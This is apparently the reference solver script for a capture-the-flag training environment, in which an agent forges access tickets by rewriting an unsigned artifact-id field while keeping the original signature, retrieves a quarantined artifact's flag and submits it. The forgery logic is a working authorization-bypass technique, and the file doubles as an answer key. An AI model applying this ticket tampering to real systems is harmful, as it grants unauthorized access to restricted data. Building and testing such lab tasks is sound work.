from __future__ import annotations

import asyncio
import json
import os
import re
import sys
from typing import Any

from app.env import CTFRLEnv

from grader.grader import load_rubric


async def solve(env: CTFRLEnv, seed: int | None = None) -> dict[str, Any]:
    """Run the intended path on the instance for ``seed``; return the last observation.

    The ticket signature covers only ``scope``, so a ticket minted for a public
    artifact can have its ``aid`` rewritten to a quarantined one and still verify.
    """
    flag_re = re.compile(load_rubric().flag_regex)
    user, password = env.reviewer_credentials()
    await env.reset(seed=seed)

    await env.step({"action": "list_releases"})
    await env.step({"action": "login", "username": user, "password": password})
    obs, *_ = await env.step({"action": "list_artifacts"})
    artifacts = obs["body"]["artifacts"]
    public = next(a for a in artifacts if a["status"] == "available")
    restricted = [a["id"] for a in artifacts if a["status"] == "quarantined"]

    obs, *_ = await env.step({"action": "mint", "artifact_id": public["id"]})
    body_b64, _, signature = obs["body"]["ticket"].partition(".")
    obs, *_ = await env.step({"action": "b64", "op": "decode", "data": body_b64})
    payload = json.loads(obs["body"]["result"])

    flag = None
    for artifact_id in restricted:
        payload["aid"] = artifact_id
        forged = json.dumps(payload, separators=(",", ":"), sort_keys=True)
        obs, *_ = await env.step({"action": "b64", "op": "encode", "data": forged})
        ticket = f"{obs['body']['result']}.{signature}"
        obs, *_ = await env.step({"action": "relay", "ticket": ticket})
        body = obs.get("body")
        match = flag_re.search(body.get("content", "")) if isinstance(body, dict) else None
        if match:
            flag = match.group(0)
            break
    if flag is None:
        raise RuntimeError("no restricted artifact yielded a flag")

    obs, *_ = await env.step({"action": "submit_flag", "flag": flag})
    return obs


async def _main() -> int:
    """Solve in-process, or against CTF_BASE_URL if set. Exit 0 on success."""
    base_url = os.environ.get("CTF_BASE_URL")
    env = CTFRLEnv(base_url=base_url, in_process=base_url is None)
    try:
        obs = await solve(env)
    finally:
        await env.close()
    grade = obs["grade"]
    print(
        json.dumps(
            {
                "solved": grade["solved"],
                "score": grade["score"],
                "turns": obs["turns_used"],
                "reached": grade["reached"],
            }
        )
    )
    return 0 if grade["solved"] else 1


if __name__ == "__main__":
    sys.exit(asyncio.run(_main()))
